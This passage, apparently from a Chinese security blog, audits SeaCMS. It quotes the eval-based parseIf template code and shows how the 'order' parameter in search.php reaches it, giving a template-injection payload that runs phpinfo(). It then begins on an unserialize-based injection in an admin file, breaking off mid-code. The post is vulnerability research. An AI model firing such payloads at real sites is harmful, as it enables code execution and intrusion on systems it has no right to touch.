+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">buildregx</span><span class="p">(</span><span class="nv">$regstr</span><span class="p">,</span><span class="nv">$regopt</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="s1">&#39;\/&#39;</span><span class="p">,</span><span class="nv">$regstr</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$regopt</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">parseStrIf</span><span class="p">(</span><span class="nv">$strIf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$strIf</span><span class="p">,</span> <span class="s1">&#39;=&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$strIf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">((</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$strIf</span><span class="p">,</span> <span class="s1">&#39;==&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$strIf</span><span class="p">,</span> <span class="s1">&#39;=&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$strIf</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span> <span class="s1">&#39;==&#39;</span><span class="p">,</span> <span class="nv">$strIf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$strIfArr</span> <span class="o">=</span>  <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;==&#39;</span><span class="p">,</span> <span class="nv">$strIf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$strIfArr</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">?</span> <span class="s1">&#39;NULL&#39;</span> <span class="o">:</span> <span class="nv">$strIfArr</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&#34;==&#34;</span> <span class="o">.</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$strIfArr</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">?</span> <span class="s1">&#39;NULL&#39;</span> <span class="o">:</span> <span class="nv">$strIfArr</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">parseIf</span><span class="p">(</span><span class="nv">$content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span> <span class="s1">&#39;{if:&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$labelRule</span> <span class="o">=</span> <span class="nx">buildregx</span><span class="p">(</span><span class="s2">&#34;{if:(.*?)}(.*?){end if}&#34;</span><span class="p">,</span> <span class="s2">&#34;is&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$labelRule2</span> <span class="o">=</span> <span class="s2">&#34;{elseif&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$labelRule3</span> <span class="o">=</span> <span class="s2">&#34;{else}&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">preg_match_all</span><span class="p">(</span><span class="nv">$labelRule</span><span class="p">,</span> <span class="nv">$content</span><span class="p">,</span> <span class="nv">$iar</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$arlen</span> <span class="o">=</span> <span class="nx">count</span><span class="p">(</span><span class="nv">$iar</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$elseIfFlag</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="nv">$m</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$m</span> <span class="o">&lt;</span> <span class="nv">$arlen</span><span class="p">;</span> <span class="nv">$m</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$strIf</span> <span class="o">=</span> <span class="nv">$iar</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$m</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$strIf</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseStrIf</span><span class="p">(</span><span class="nv">$strIf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$strThen</span> <span class="o">=</span> <span class="nv">$iar</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="nv">$m</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$strThen</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseSubIf</span><span class="p">(</span><span class="nv">$strThen</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$strThen</span><span class="p">,</span> <span class="nv">$labelRule2</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$strThen</span><span class="p">,</span> <span class="nv">$labelRule3</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">$elsearray</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="nv">$labelRule3</span><span class="p">,</span> <span class="nv">$strThen</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">$strThen1</span> <span class="o">=</span> <span class="nv">$elsearray</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">$strElse1</span> <span class="o">=</span> <span class="nv">$elsearray</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                    <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="s2">&#34;if(&#34;</span> <span class="o">.</span> <span class="nv">$strIf</span> <span class="o">.</span> <span class="s2">&#34;){</span><span class="se">\$</span><span class="s2">ifFlag=true;}else{</span><span class="se">\$</span><span class="s2">ifFlag=false;}&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="nv">$ifFlag</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="nv">$content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="nv">$iar</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="nv">$m</span><span class="p">],</span> <span class="nv">$strThen1</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="nv">$content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="nv">$iar</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="nv">$m</span><span class="p">],</span> <span class="nv">$strElse1</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="s2">&#34;if(&#34;</span> <span class="o">.</span> <span class="nv">$strIf</span> <span class="o">.</span> <span class="s2">&#34;) { </span><span class="se">\$</span><span class="s2">ifFlag=true;} else{ </span><span class="se">\$</span><span class="s2">ifFlag=false;}&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="nv">$ifFlag</span><span class="p">)</span> <span class="nv">$content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="nv">$iar</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="nv">$m</span><span class="p">],</span> <span class="nv">$strThen</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">else</span> <span class="nv">$content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="nv">$iar</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="nv">$m</span><span class="p">],</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$elseIfArray</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="nv">$labelRule2</span><span class="p">,</span> <span class="nv">$strThen</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$elseIfArrayLen</span> <span class="o">=</span> <span class="nx">count</span><span class="p">(</span><span class="nv">$elseIfArray</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$elseIfSubArray</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="nv">$labelRule3</span><span class="p">,</span> <span class="nv">$elseIfArray</span><span class="p">[</span><span class="nv">$elseIfArrayLen</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$resultStr</span> <span class="o">=</span> <span class="nv">$elseIfSubArray</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$elseIfArraystr0</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$elseIfArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">                <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="s2">&#34;if(</span><span class="si">$strIf</span><span class="s2">){</span><span class="se">\$</span><span class="s2">resultStr=</span><span class="se">\&#34;</span><span class="si">$elseIfArraystr0\</span><span class="s2">&#34;</span><span class="p">;}</span><span class="s2">&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                for (</span><span class="si">$elseIfLen</span><span class="s2"> = 1; </span><span class="si">$elseIfLen</span><span class="s2"> &lt; </span><span class="si">$elseIfArrayLen</span><span class="s2">; </span><span class="si">$elseIfLen</span><span class="s2">++) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    </span><span class="si">$strElseIf</span><span class="s2"> = getSubStrByFromAndEnd(</span><span class="si">$elseIfArray[$elseIfLen]</span><span class="s2">, &#34;</span><span class="o">:</span><span class="s2">&#34;, &#34;</span><span class="p">}</span><span class="s2">&#34;, &#34;&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    </span><span class="si">$strElseIf</span><span class="s2"> = </span><span class="si">$this-&gt;parseStrIf</span><span class="s2">(</span><span class="si">$strElseIf</span><span class="s2">);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    </span><span class="si">$strElseIfThen</span><span class="s2"> = addslashes(getSubStrByFromAndEnd(</span><span class="si">$elseIfArray[$elseIfLen]</span><span class="s2">, &#34;</span><span class="p">}</span><span class="s2">&#34;, &#34;&#34;, &#34;</span><span class="nx">start</span><span class="s2">&#34;));
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    @eval(&#34;</span><span class="k">if</span><span class="p">(</span><span class="s2">&#34; . </span><span class="si">$strElseIf</span><span class="s2"> . &#34;</span><span class="p">){</span><span class="nx">\</span><span class="nv">$resultStr</span><span class="o">=</span><span class="nx">\</span><span class="s2">&#34;</span><span class="si">$strElseIfThen\</span><span class="s2">&#34;</span><span class="p">;}</span><span class="s2">&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    @eval(&#34;</span><span class="k">if</span><span class="p">(</span><span class="s2">&#34; . </span><span class="si">$strElseIf</span><span class="s2"> . &#34;</span><span class="p">){</span><span class="nx">\</span><span class="nv">$elseIfFlag</span><span class="o">=</span><span class="k">true</span><span class="p">;}</span><span class="k">else</span><span class="p">{</span><span class="nx">\</span><span class="nv">$elseIfFlag</span><span class="o">=</span><span class="k">false</span><span class="p">;}</span><span class="s2">&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    if (</span><span class="si">$elseIfFlag</span><span class="s2">) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                        break;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    }
+</span></span></span><span class="line"><span class="cl"><span class="s2">                }
+</span></span></span><span class="line"><span class="cl"><span class="s2">                </span><span class="si">$strElseIf0</span><span class="s2"> = getSubStrByFromAndEnd(</span><span class="si">$elseIfSubArray[0]</span><span class="s2">, &#34;</span><span class="o">:</span><span class="s2">&#34;, &#34;</span><span class="p">}</span><span class="s2">&#34;, &#34;&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                </span><span class="si">$strElseIfThen0</span><span class="s2"> = addslashes(getSubStrByFromAndEnd(</span><span class="si">$elseIfSubArray[0]</span><span class="s2">, &#34;</span><span class="p">}</span><span class="s2">&#34;, &#34;&#34;, &#34;</span><span class="nx">start</span><span class="s2">&#34;));
+</span></span></span><span class="line"><span class="cl"><span class="s2">                if (strpos(</span><span class="si">$strElseIf0</span><span class="s2">, &#39;==&#39;) === false &amp;&amp; strpos(</span><span class="si">$strElseIf0</span><span class="s2">, &#39;=&#39;) &gt; 0) </span><span class="si">$strElseIf0</span><span class="s2"> = str_replace(&#39;=&#39;, &#39;==&#39;, </span><span class="si">$strElseIf0</span><span class="s2">);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                @eval(&#34;</span><span class="k">if</span><span class="p">(</span><span class="s2">&#34; . </span><span class="si">$strElseIf0</span><span class="s2"> . &#34;</span><span class="p">){</span><span class="nx">\</span><span class="nv">$resultStr</span><span class="o">=</span><span class="nx">\</span><span class="s2">&#34;</span><span class="si">$strElseIfThen0\</span><span class="s2">&#34;</span><span class="p">;</span><span class="nx">\</span><span class="nv">$elseIfFlag</span><span class="o">=</span><span class="k">true</span><span class="p">;}</span><span class="s2">&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                </span><span class="si">$content</span><span class="s2"> = str_replace(</span><span class="si">$iar[0]</span><span class="s2">[</span><span class="si">$m</span><span class="s2">], </span><span class="si">$resultStr</span><span class="s2">, </span><span class="si">$content</span><span class="s2">);
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">        }
+</span></span></span><span class="line"><span class="cl"><span class="s2">        return </span><span class="si">$content</span><span class="s2">;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    }
+</span></span></span><span class="line"><span class="cl"><span class="s2">}
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>在<code>parseIf</code>中利用正则提取内容,然后把内容分拆后放到<code>eval</code>中从而达到代码执行的目的</p>
+<p>搜索<code>parseIf</code>的引用,发现在<code>search.php</code>中会向模板中插入用户数据后传递给<code>parseIf</code>(其他的php没有这种行为,只会直接将模板读取然后传递给<code>parseIf</code>)</p>
+<p>一开始我用的是<code>searchword</code>参数,但是传递进去后发现内容被修改,然后我换成<code>order</code>参数,发现这个参数只进行<code>addslashes</code>转义操作</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081416771.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081416771.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081416771.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081416771.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081416771.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081416771.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081419458.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081419458.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081419458.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081419458.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081419458.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081419458.png" /></p>
+<p>将<code>order</code>参数利用<code>str_replace</code>替换到<code>content</code>后,<code>content</code>被传递到<code>parseIf</code>进行分拆并eval执行</p>
+<p>最终payload</p>
+<p><code>searchtype=5&amp;order=&quot;}asdf{end if}  {if:phpinfo()}asdf{end if}</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081454475.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081454475.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081454475.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081454475.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081454475.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081454475.png" /></p>
+<p><a href="https://github.com/jiangsir404/PHP-code-audit/blob/master/seacms/seacms%20%E5%A4%9A%E4%B8%AA%E7%89%88%E6%9C%AC%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%28search.php%29.md" target="_blank" rel="noopener noreffer ">一个师傅的分析文章 seacms 多个版本的代码执行漏洞总结</a></p>
+<h2 id="adminadmin_collect_newsphp存在注入无视waf">admin/admin_collect_news.php存在注入(无视waf)</h2>
+<p>反引号注入,正则搜索规则`[$][A-Za-z0-9_]*`</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">elseif</span><span class="p">(</span><span class="nv">$action</span><span class="o">==</span><span class="s2">&#34;importok&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$importrule</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$importrule</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$importrule</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">ShowMsg</span><span class="p">(</span><span class="s2">&#34;规则内容为空！&#34;</span><span class="p">,</span><span class="s2">&#34;-1&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//对Base64格式的规则进行解码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span><span class="p">(</span><span class="nx">m_ereg</span><span class="p">(</span><span class="s1">&#39;^BASE64:&#39;</span><span class="p">,</span><span class="nv">$importrule</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">m_ereg</span><span class="p">(</span><span class="s1">&#39;:END$&#39;</span><span class="p">,</span><span class="nv">$importrule</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">ShowMsg</span><span class="p">(</span><span class="s1">&#39;该规则不合法，Base64格式的采集规则为：BASE64:base64编码后的配置:END !&#39;</span><span class="p">,</span><span class="s1">&#39;-1&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="k">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$importrules</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">,</span><span class="nv">$importrule</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$importrule</span> <span class="o">=</span> <span class="nv">$importrules</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$importrule</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$importrule</span><span class="p">))</span> <span class="k">OR</span>  <span class="k">die</span><span class="p">(</span><span class="s1">&#39;配置字符串有错误！&#39;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">		<span class="c1">//die(base64_decode($importrule));
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">else</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">ShowMsg</span><span class="p">(</span><span class="s1">&#39;该规则不合法，Base64格式的采集规则为：BASE64:base64编码后的配置:END !&#39;</span><span class="p">,</span><span class="s1">&#39;-1&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$importrule</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$importrule</span><span class="p">[</span><span class="s1">&#39;config&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$importrule</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">ShowMsg</span><span class="p">(</span><span class="s1">&#39;该规则不合法，无法导入!&#39;</span><span class="p">,</span><span class="s1">&#39;-1&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$data</span> <span class="o">=</span> <span class="nv">$importrule</span><span class="p">[</span><span class="s1">&#39;config&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">unset</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;cid&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;cname&#39;</span><span class="p">]</span><span class="o">.=</span><span class="s2">&#34;(导入时间:&#34;</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;Y-m-d H:i:s&#34;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;)&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;cotype&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$sql</span> <span class="o">=</span> <span class="nx">si</span><span class="p">(</span><span class="s2">&#34;sea_co_config&#34;</span><span class="p">,</span><span class="nv">$data</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$dsql</span><span class="o">-&gt;</span><span class="na">ExecuteNoneQuery</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$cid</span> <span class="o">=</span> <span class="nv">$dsql</span><span class="o">-&gt;</span><span class="na">GetLastID</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$importrule</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">		<span class="k">foreach</span> <span class="p">(</span><span class="nv">$importrule</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$type</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">unset</span><span class="p">(</span><span class="nv">$type</span><span class="p">[</span><span class="s1">&#39;tid&#39;</span><span class="p">]);</span>
